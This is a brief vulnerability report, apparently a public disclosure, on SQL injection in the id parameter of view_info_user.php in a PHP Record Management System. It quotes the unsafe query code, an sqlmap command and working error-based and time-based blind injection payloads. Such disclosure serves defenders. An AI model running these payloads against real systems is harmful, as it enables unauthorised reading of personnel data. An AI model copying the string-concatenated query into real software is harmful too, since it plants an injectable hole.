### VUL_AUTHOR:netmanzhang
# Record Management System - SQL Injection on (view_info_user.php id parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
view_info_user.php 

On this page, id parameter is vulnerable to SQL Injection Attack 
## Source code(Personnel_record_management_system/view_info_user.php):
```
$get_id=$_GET['id'];
$get_query=mysqli_query($conn,"select * from employee where employeeID='$get_id'")or die(mysqli_error());
$row=mysqli_fetch_array($get_query);$id=$row['employeeID'];
```
## Proof of vulnerability(Verify using the sqlmap tool):
#### -> sqlmap -u http://localhost/Personnel_record_management_system/view_info_user.php?id=166--batch
## Output:
```
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=166'||(SELECT 0x5863715a WHERE 2674=2674 AND (SELECT 6770 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(6770=6770,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=166'||(SELECT 0x6352424a WHERE 5250=5250 AND (SELECT 3715 FROM (SELECT(SLEEP(5)))dazK))||'
---
```
